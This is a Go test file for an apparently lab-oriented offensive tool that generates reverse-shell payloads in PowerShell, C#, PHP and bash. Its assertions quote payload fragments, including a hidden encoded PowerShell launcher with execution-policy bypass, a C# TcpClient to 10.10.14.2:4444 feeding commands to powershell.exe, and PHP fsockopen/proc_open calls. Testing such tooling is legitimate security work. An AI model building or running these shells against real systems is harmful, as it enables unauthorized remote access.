package internal

import (
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func TestGeneratePowerShellDetachedUsesStartProcess(t *testing.T) {
	gen := NewReverseShellGenerator("10.10.14.2", 4444)
	payload := gen.GeneratePowerShellDetached()

	checks := []string{
		"Start-Process powershell",
		"-WindowStyle Hidden",
		"-ArgumentList @(",
		"-EncodedCommand",
		"| Out-Null",
	}

	for _, check := range checks {
		if !strings.Contains(payload, check) {
			t.Fatalf("expected detached payload to contain %q, got: %s", check, payload)
		}
	}
	if strings.Contains(payload, "cmd /c powershell -e") || strings.Contains(payload, "cmd /c start") {
		t.Fatalf("expected detached payload to avoid cmd launcher wrappers, got: %s", payload)
	}
}

func TestGenerateCSharpSourceContainsConnectionAndProcessLoop(t *testing.T) {
	gen := NewReverseShellGenerator("10.10.14.2", 4444)
	src := gen.GenerateCSharpSource()
	checks := []string{
		`new TcpClient("10.10.14.2", 4444)`,
		`FLAME_CSHARP`,
		`if (args.Length == 0 || args[0] != "--child")`,
		`Arguments = "--child"`,
		`UseShellExecute = true`,
		`FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"`,
		`Arguments = "-ep bypass -nologo"`,
		`OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived)`,
		`ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived)`,
		`BeginOutputReadLine()`,
		`BeginErrorReadLine()`,
		`private static StreamWriter streamWriter;`,
		`streamWriter.AutoFlush = true;`,
		`proc.StandardInput.WriteLine("Get-Location | Out-Null");`,
		`proc.StandardInput.WriteLine(userInput);`,
		`proc.StandardInput.Flush();`,
	}
	for _, check := range checks {
		if !strings.Contains(src, check) {
			t.Fatalf("expected C# source to contain %q, got: %s", check, src)
		}
	}
}

func TestParseRevArgs(t *testing.T) {
	tests := []struct {
		name    string
		args    []string
		mode    string
		target  string
		wantErr bool
	}{
		{name: "default", args: nil, mode: "default"},
		{name: "bash clipboard", args: []string{"bash"}, mode: "bash"},
		{name: "ps1 clipboard", args: []string{"ps1"}, mode: "ps1"},
		{name: "php clipboard", args: []string{"php"}, mode: "php"},
		{name: "csharp print", args: []string{"csharp"}, mode: "csharp"},
		{name: "csharp compile", args: []string{"csharp", "shell.exe"}, mode: "csharp", target: "shell.exe"},
		{name: "php file", args: []string{"php", "shell.php"}, mode: "php", target: "shell.php"},
		{name: "unknown subcommand", args: []string{"10.10.10.10"}, wantErr: true},
		{name: "too many csharp args", args: []string{"csharp", "a.exe", "extra"}, wantErr: true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			mode, target, err := parseRevArgs(tt.args)
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected error")
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if mode != tt.mode || target != tt.target {
				t.Fatalf("expected (%q,%q), got (%q,%q)", tt.mode, tt.target, mode, target)
			}
		})
	}
}

func TestGeneratePHPSourceContainsReverseShellLoop(t *testing.T) {
	gen := NewReverseShellGenerator("10.10.14.2", 4444)
	src := gen.GeneratePHPSource()
	checks := []string{
		"fsockopen",
		"proc_open",
		"stream_select",
		"10.10.14.2",
		"4444",
	}
	for _, check := range checks {
		if !strings.Contains(src, check) {
			t.Fatalf("expected PHP source to contain %q, got: %s", check, src)
		}
	}
}

func TestResolveRevActionModes(t *testing.T) {
	gen := NewReverseShellGenerator("10.10.14.2", 4444)

	tests := []struct {
		name         string
		mode         string
		target       string
		wantCopy     bool
		wantFile     string
		wantCompile  bool
		wantContains string
	}{
		{name: "bash clipboard", mode: "bash", wantCopy: true, wantContains: "bash -c"},
		{name: "ps1 clipboard", mode: "ps1", wantCopy: true, wantContains: "powershell -e"},
		{name: "csharp clipboard", mode: "csharp", wantCopy: true, wantContains: "FLAME_CSHARP"},
		{name: "csharp file", mode: "csharp", target: "shell.exe", wantFile: "shell.exe", wantCompile: true, wantContains: "FLAME_CSHARP"},
		{name: "php clipboard", mode: "php", wantCopy: true, wantContains: "fsockopen"},
		{name: "php file", mode: "php", target: "shell.php", wantFile: "shell.php", wantContains: "fsockopen"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			action, err := resolveRevAction(gen, tt.mode, tt.target)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if action.CopyToClipboard != tt.wantCopy {
				t.Fatalf("expected copy=%v, got %+v", tt.wantCopy, action)
			}
			if action.OutputPath != tt.wantFile {
				t.Fatalf("expected file %q, got %+v", tt.wantFile, action)
			}
			if action.CompileBinary != tt.wantCompile {
				t.Fatalf("expected compile=%v, got %+v", tt.wantCompile, action)
			}
			if !strings.Contains(action.Payload, tt.wantContains) {
				t.Fatalf("expected payload to contain %q, got %s", tt.wantContains, action.Payload)
			}
		})
	}
}

func TestParseSSHArgsPasswordMode(t *testing.T) {
	args, err := parseSSHArgs([]string{"user@10.10.10.10", "-p", "secret"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if args.Target != "user@10.10.10.10" {
		t.Fatalf("expected target, got %q", args.Target)
	}
	if args.Password != "secret" {
		t.Fatalf("expected password mode, got %+v", args)
	}
	if args.Port != 22 {
		t.Fatalf("expected default port 22, got %d", args.Port)
	}
}

func TestParseSSHArgsKeyModeWithPort(t *testing.T) {
	args, err := parseSSHArgs([]string{"user@10.10.10.10", "-i", "id_rsa", "--port", "2222"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if args.KeyPath != "id_rsa" {
		t.Fatalf("expected key path, got %+v", args)
	}
	if args.Port != 2222 {
		t.Fatalf("expected custom port, got %d", args.Port)
	}
}

func TestCompileCSharpSourceSkipsOrBuilds(t *testing.T) {
	if _, err := exec.LookPath("mcs"); err != nil {
		t.Skip("mcs not installed")
	}
	tmp := t.TempDir()
	output := filepath.Join(tmp, "hello.exe")
	source := `using System; class Program { static void Main() { Console.WriteLine("hi"); } }`
	if err := compileCSharpSource(source, output); err != nil {
		t.Fatalf("compile failed: %v", err)
	}
}
